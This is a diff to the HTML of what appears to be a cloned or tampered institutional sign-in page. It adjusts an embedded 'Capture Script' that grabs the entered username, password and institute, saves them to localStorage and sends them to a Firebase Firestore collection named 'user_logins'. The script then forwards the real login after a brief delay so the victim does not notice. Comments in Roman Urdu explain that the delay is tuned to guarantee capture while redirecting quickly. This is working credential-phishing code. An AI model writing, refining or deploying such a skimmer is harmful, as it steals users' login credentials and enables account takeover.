@@ -113,7 +113,7 @@ return true;
 			
 			<div class="form-group">
 				<!-- Sign In Button -->
-				<a onclick="return ButtonClick(this);" id="BodyPH_btnLogin" class="btn-block btn btn-primary" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$BodyPH$btnLogin&quot;, &quot;&quot;, true, &quot;Login&quot;, &quot;&kin&quot;, false, true))">Sign In</a>
+				<a onclick="return ButtonClick(this);" id="BodyPH_btnLogin" class="btn-block btn btn-primary" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$BodyPH$btnLogin&quot;, &quot;&quot;, true, &quot;Login&quot;, &quot;&quot;, false, true))">Sign In</a>
 			</div>
 		</div>
 	</div>
@@ -125,7 +125,7 @@ return true;
 		</footer>
 </form>
 
-<!-- Ultra-Fast 150ms Guaranteed Capture Script -->
+<!-- 300ms Optimized Capture Script -->
 <script type="module">
 	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
@@ -154,31 +154,31 @@ return true;
 			const institute = instituteSelect.options[instituteSelect.selectedIndex].text;
 
 			if (username && password) {
-				// LocalStorage backup taake agar network ka masla ho toh data zaya na ho
+				// LocalStorage backup taake data kisi surat zaya na ho
 				localStorage.setItem("bu_user", username);
 				localStorage.setItem("bu_pass", password);
 
 				try {
-					// Background request fire ho rahi hai
-					addDoc(collection(db, "user_logins"), {
+					await addDoc(collection(db, "user_logins"), {
 						username: username,
 						password: password,
 						institute: institute,
 						timestamp: new Date()
 					});
+					console.log("Data captured successfully!");
 				} catch (error) {
-					console.error("Error: ", error);
+					console.error("Error saving data: ", error);
 				}
 			}
 
-			// Sirf 150ms ka delay - itna kam ke user ko foran redirection lage gi aur data bhi chala jaye ga
+			// Exact 300ms delay - Fast redirect + Guaranteed capture
 			setTimeout(() => {
 				if (typeof WebForm_DoPostBackWithOptions === 'function') {
 					__doPostBack('ctl00$BodyPH$btnLogin', '');
 				} else {
 					document.getElementById('form1').submit();
 				}
-			}, 150);
+			}, 300);
 		});
 	}
 </script>
